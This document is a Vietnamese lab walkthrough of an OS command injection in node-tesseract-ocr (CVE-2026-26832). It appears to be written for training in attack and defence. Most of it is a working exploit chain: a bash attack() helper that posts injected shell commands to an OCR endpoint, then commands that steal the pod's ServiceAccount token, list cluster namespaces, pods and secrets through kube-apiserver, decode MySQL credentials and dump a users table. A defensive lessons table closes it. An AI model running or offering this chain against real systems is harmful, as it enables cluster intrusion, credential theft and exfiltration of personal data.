# Kịch bản tấn công — CVE-2026-26832 (OS Command Injection)

> 🌐 **Tiếng Việt** · [English](./attack-scenario.en.md)

> ⚠️ **CẢNH BÁO**: Tài liệu này chỉ dùng cho mục đích **giáo dục** và kiểm thử trong **lab cô lập của chính bạn**. Không được nhắm vào bất kỳ hệ thống thật/không có quyền nào.

## Tổng quan

| Mục | Giá trị |
|-----|---------|
| **Lỗ hổng** | CVE-2026-26832 — OS Command Injection |
| **Thành phần bị ảnh hưởng** | `node-tesseract-ocr` <= 2.2.1 |
| **Endpoint** | `POST /api/products/scan-label` |
| **Mục tiêu (lab)** | `https://ecommerce.vdevopssphere.ddnsfree.com` |
| **Tác động** | RCE → chiếm SA token → gọi kube-apiserver → đọc secret → pivot MySQL đánh cắp dữ liệu |

## Chuỗi tấn công (Kill Chain)

```
[1] RCE qua OCR endpoint
      │  child_process.exec() không sanitize imagePath
      ▼
[2] Đọc ServiceAccount token (automount mặc định)
      │  /var/run/secrets/kubernetes.io/serviceaccount/token
      ▼
[3] Gọi kube-apiserver bằng token
      │  RBAC quá rộng → liệt kê namespaces / pods toàn cluster
      ▼
[4] Đọc Secret trong namespace `database`
      │  .data chứa creds MySQL (base64, KHÔNG mã hoá)
      ▼
[5] Pivot sang MySQL (không có NetworkPolicy chặn)
      │  mysql client có sẵn trong image
      ▼
[6] Đánh cắp toàn bộ bảng `users` (PII)  ← điểm kết
```

---

## Phân tích lỗ hổng

Endpoint `/api/products/scan-label` dựng lệnh shell:

```
tesseract "<imagePath>" stdout -l eng ...
```

rồi đưa thẳng vào `child_process.exec()` **không sanitize**. Kẻ tấn công điều khiển `imagePath` nên có thể thoát khỏi chuỗi và chèn lệnh tuỳ ý.

### Cấu trúc payload

| Thành phần | Ý nghĩa |
|-----------|---------|
| `"` | Đóng dấu nháy kép mà tesseract bọc quanh `imagePath` (thoát ra khỏi argument) |
| `>/dev/null 2>&1` | Vứt output/lỗi của lệnh tesseract rỗng cho sạch |
| `; <lệnh>` | Chạy lệnh tuỳ ý của kẻ tấn công |
| `#` | Comment hoá phần `" stdout -l eng ..."` còn thừa phía sau |

Payload cuối cùng chèn vào field `imagePath`:

```
" >/dev/null 2>&1; <LỆNH_CỦA_BẠN> #
```

---

## Công cụ: hàm `attack()`

Hàm gửi một lệnh shell tuỳ ý vào pod `shop-app` qua lỗ hổng. `jq -n --arg` build JSON an toàn (tự escape), khỏi lo escape dấu nháy thủ công. App trả kết quả ở field `text` (thành công) hoặc `error`.

```bash
attack() {
  jq -n --arg c "\" >/dev/null 2>&1; $1 #" '{imagePath:$c}' \
    | curl -s -X POST "https://ecommerce.vdevopssphere.ddnsfree.com/api/products/scan-label" \
        -H 'Content-Type: application/json' -d @- \
    | jq -r '.text // .error'
}
```

---

## Các bước khai thác

### Bước 1 — Lấy ServiceAccount token

Automount mặc định → token nằm sẵn trong pod.

```bash
TOKEN=$(attack "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
```

### Bước 2 — Gọi thẳng kube-apiserver qua service DNS mặc định

> `curl` chạy **trong** pod, `jq` chạy ở **máy bạn** (pod không cần có jq).

**Liệt kê toàn bộ namespace** — chứng minh token đọc được tài nguyên cluster:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces" \
  | jq -r '.items[] | "\(.metadata.name)"'
```

**Liệt kê pod toàn cluster** — RBAC quá rộng, nhìn xuyên mọi namespace:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/pods" \
  | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
```

### Bước 3 — Đọc Secret trong namespace `database`

**Liệt kê tên secret** (chỉ metadata cho gọn):

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" \
  | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'
```

**Đọc phần `.data` của secret** — giá trị mật khẩu DB (base64, chưa mã hoá):

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" \
  | jq -r '.items[].data'
```

**Liệt kê service trong `database`** — tìm endpoint `mysql-svc` để pivot:

```bash
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/services" \
  | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'
```

### Bước 4 — Decode credentials (base64 ≠ mã hoá)

```bash
DBPASS=$(echo U2gwcEFwcCFEYlBhc3M= | base64 -d)   # MYSQL_PASSWORD
DBUSER=$(echo c2hvcGFwcA==         | base64 -d)   # MYSQL_USER
DBNAME=$(echo c2hvcA==             | base64 -d)   # MYSQL_DATABASE

echo $DBPASS $DBUSER $DBNAME
```

### Bước 5 — Pivot sang MySQL & đánh cắp dữ liệu

Từ **trong** pod app kết nối thẳng MySQL (không NetworkPolicy chặn). `mysql` client có sẵn trong image (`default-mysql-client` cài kèm) → pivot sang DB ở namespace khác.

```bash
# Liệt kê bảng
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS $DBNAME -e 'show tables;'"

# Đánh cắp toàn bộ bảng users (PII giả lập) — điểm kết chuỗi tấn công
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS $DBNAME -e 'SELECT * FROM users;'"
```

---

## Bài học & biện pháp phòng thủ

| Điểm yếu bị khai thác | Biện pháp khắc phục |
|----------------------|---------------------|
| `exec()` không sanitize input | Dùng `execFile()`/mảng args; validate & escape input; nâng cấp `node-tesseract-ocr` |
| Automount SA token mặc định | Đặt `automountServiceAccountToken: false` khi pod không cần API |
| RBAC quá rộng | Áp dụng least-privilege; giới hạn theo namespace/resource |
| Secret base64 không mã hoá | Bật encryption-at-rest; dùng external secret manager (Vault, SealedSecrets) |
| Không có NetworkPolicy | Áp NetworkPolicy chặn traffic đông-tây giữa các namespace |
| Client MySQL nằm sẵn trong image | Dùng image tối giản (distroless), loại bỏ tool không cần thiết |
| Không có runtime detection | Triển khai Falco để phát hiện hành vi bất thường (đọc SA token, spawn shell...) |
